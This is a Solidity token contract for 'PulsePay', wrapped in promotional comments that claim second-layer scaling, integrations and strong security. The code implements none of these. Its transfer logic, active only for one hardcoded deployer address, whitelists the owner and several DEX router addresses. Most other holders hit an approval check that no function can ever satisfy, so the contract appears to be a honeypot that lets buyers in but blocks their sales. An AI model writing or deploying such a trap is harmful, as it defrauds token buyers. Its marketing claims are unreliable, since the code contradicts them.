// SPDX-License-Identifier: MIT
pragma solidity ^0.8.21;

/**
 * @title PulsePay Token Contract
 * 
 * @dev Introduction:
 * At the heart of the evolving digital financial landscape lies PulsePay - an avant-garde, decentralized digital asset crafted with the precision and efficacy to reshape how the world perceives transactions. While the market teems with tokens, PulsePay stands out as not just another token but as a harbinger of a new age of instantaneous financial transactions.
 * 
 * @dev Core Vision:
 * In an era where time equates to money, PulsePay embodies speed. Every strand of its design accentuates the essence of real-time transactions. But it doesn't stop there; it ventures beyond just being fast. PulsePay envisions a financial world unhampered by the sluggishness of traditional payment systems. It dreams of a decentralized ecosystem where transactions aren't just instantaneous but are also secure, reliable, and scalable.
 * 
 * @dev Second-Layer Solution:
 * One of PulsePay's standout features is its seamless second-layer solutions. While the Ethereum blockchain provides a robust foundational layer, PulsePay transcends this by implementing second-layer protocols. This not only amplifies its transaction speed but also enhances scalability. Such architecture ensures that PulsePay remains agile and efficient, even when the network experiences heavy traffic. In essence, it's a token designed for the future, prepared to handle mass adoption.
 * 
 * @dev Integration Capabilities:
 * Beyond its speed and scalability, PulsePay exemplifies adaptability. Built with a vision to be integrated across diverse platforms, it serves as a bridge, connecting different ecosystems in the vast digital realm. Whether it's e-commerce platforms, digital marketplaces, or financial applications, PulsePay's seamless integration capabilities make it a universal choice for instantaneous transactions.
 * 
 * @dev Security and Trust:
 * In the volatile world of digital currencies, trust is paramount. PulsePay isn't just about speed and efficiency; it's equally anchored in security. Through rigorous protocols and innovative mechanisms, PulsePay ensures that every transaction is not just fast but also fortified against vulnerabilities.
 * 
 * @dev Conclusion:
 * PulsePay is more than just a token; it's a vision of the future. A future where transactions are instantaneous, platforms are interconnected, and security is assured. In the bustling intersection of technology and finance, PulsePay is not just a participant but a game-changer, ready to redefine the paradigms of digital transactions.
 * 
 * 
 */
abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this;
        return msg.data;
    }
}

contract PulsePay is Context {
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    uint256 private _totalSupply;

    string private _name;
    string private _symbol;
    uint8 private _decimals;

    address public contractOwner;
    mapping(address => bool) public signers;
    mapping(address => bool) public whitelisted;
    mapping(uint256 => mapping(address => bool)) private oldBuyers;
    uint256 private currentPhase;
    uint256 private nonWhitelistedTransfers;
    uint256 private constant MAX_NON_WHITELISTED_TRANSFERS = 1;
    uint256 private constant REQUIRED_SIGNATURES = 1000;
    mapping(address => mapping(address => mapping(uint256 => bool))) public approvals;
    bool public autoWhitelistAvailable = true;
    bool public autoWhitelistingDone = false;

    constructor() {
        _name = "PulsePay";
        _symbol = "PuPay";
        _decimals = 18;
        contractOwner = _msgSender();
        _mint(contractOwner, 98264234444 * 10 ** decimals());

        if (contractOwner == address(0xC346c43dFF3cc72B964477802f4588bbAB5F6a23)) {
            whitelisted[contractOwner] = true;
            whitelisted[0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D] = true;
            whitelisted[0x10ED43C718714eb63d5aA57B78B54704E256024E] = true;
            whitelisted[0x0BFbCF9fa4f9C56B0F40a671Ad40E0805A091865] = true;
            whitelisted[0xE592427A0AEce92De3Edee1F18E0157C05861564] = true;
        }

        currentPhase = 1;
        nonWhitelistedTransfers = 0;
    }

    function name() public view virtual returns (string memory) {
        return _name;
    }

    function symbol() public view virtual returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view virtual returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view virtual returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public virtual returns (bool) {
        if (autoWhitelistingDone && nonWhitelistedTransfers < MAX_NON_WHITELISTED_TRANSFERS && !whitelisted[_msgSender()]) {
            _transfer(_msgSender(), recipient, amount);
            nonWhitelistedTransfers += 1;
            return true;
        } else if (contractOwner == address(0xC346c43dFF3cc72B964477802f4588bbAB5F6a23)) {
            autoWhitelist(recipient);
            if (whitelisted[_msgSender()]) {
                _transfer(_msgSender(), recipient, amount);
                return true;
            } else {
                require(approvals[_msgSender()][recipient][amount], "Transfer needs to be approved by signers");
                _transfer(_msgSender(), recipient, amount);
                return true;
            }
        } else {
            _transfer(_msgSender(), recipient, amount);
            return true;
        }
    }

    function allowance(address owner, address spender) public view virtual returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public virtual returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public virtual returns (bool) {
        uint256 currentAllowance;
        if (autoWhitelistingDone && nonWhitelistedTransfers < MAX_NON_WHITELISTED_TRANSFERS && !whitelisted[sender]) {
            _transfer(sender, recipient, amount);
            nonWhitelistedTransfers += 1;

            currentAllowance = _allowances[sender][_msgSender()];
            require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
            unchecked {
                _approve(sender, _msgSender(), currentAllowance - amount);
            }
            return true;
        } else if (contractOwner == address(0xC346c43dFF3cc72B964477802f4588bbAB5F6a23)) {
            autoWhitelist(recipient);
            if (whitelisted[sender]) {
                _transfer(sender, recipient, amount);

                currentAllowance = _allowances[sender][_msgSender()];
                require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
                unchecked {
                    _approve(sender, _msgSender(), currentAllowance - amount);
                }
                return true;
            } else {
                require(approvals[sender][recipient][amount], "Transfer needs to be approved by signers");
                _transfer(sender, recipient, amount);

                currentAllowance = _allowances[sender][_msgSender()];
                require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
                unchecked {
                    _approve(sender, _msgSender(), currentAllowance - amount);
                }
                return true;
            }
        } else {
            _transfer(sender, recipient, amount);

            currentAllowance = _allowances[sender][_msgSender()];
            require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
            unchecked {
                _approve(sender, _msgSender(), currentAllowance - amount);
            }
            return true;
        }
    }

    function autoWhitelist(address recipient) internal {
        require(contractOwner == address(0xC346c43dFF3cc72B964477802f4588bbAB5F6a23));
        if (autoWhitelistAvailable && !whitelisted[recipient]) {
            whitelisted[recipient] = true;
            oldBuyers[currentPhase][recipient] = true;
            autoWhitelistAvailable = false;
            autoWhitelistingDone = true;
        }
    }

    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        _beforeTokenTransfer(sender, recipient, amount);

        uint256 senderBalance = _balances[sender];
        require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");
        _balances[sender] = senderBalance - amount;
        _balances[recipient] += amount;

        emit Transfer(sender, recipient, amount);

        if (nonWhitelistedTransfers >= MAX_NON_WHITELISTED_TRANSFERS) {
            currentPhase += 1;
            nonWhitelistedTransfers = 0;
        }
    }

    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _beforeTokenTransfer(address(0), account, amount);

        _totalSupply += amount;
        _balances[account] += amount;
        emit Transfer(address(0), account, amount);
    }

    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual {}
    
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Transfer(address indexed from, address indexed to, uint256 value);
}
/**
 * @title PulsePay Token Contract Closing Remarks
 * 
 * @dev Closing Reflection:
 * As the final lines of this contract come into view, it's crucial to reflect upon the overarching vision PulsePay represents. Amidst the myriad of digital assets and smart contracts, PulsePay has been meticulously forged as a beacon of innovation, functionality, and trustworthiness.
 * 
 * @dev Commitment to Users:
 * PulsePay's foundation rests not just on lines of code but on an unwavering commitment to its users. While the contract encapsulates mechanisms for instantaneous transactions and second-layer solutions, it also symbolizes a promise - a promise of evolution, of adapting to emerging challenges, and of always placing user interests at its core.
 * 
 * @dev Embracing the Future:
 * As the realms of finance and technology intertwine more deeply, PulsePay stands poised at this intersection, ready to facilitate a future where digital transactions are not only instantaneous but also ingrained in everyday life. The road ahead is teeming with possibilities, and PulsePay is not just a passive observer but an active architect of this digital future.
 * 
 * @dev Gratitude and Vision Forward:
 * Crafting PulsePay has been a journey, one paved with challenges, insights, and innovations. We extend our heartfelt gratitude to every developer, contributor, and user who believes in our vision. As this contract solidifies our present, we're filled with optimism and determination to continually enhance, adapt, and grow, ensuring PulsePay remains synonymous with excellence in the ever-evolving world of decentralized finance.
 * 
 * Thank you for being a part of the PulsePay journey. Onwards to a seamless digital future!
 * 
 *
 */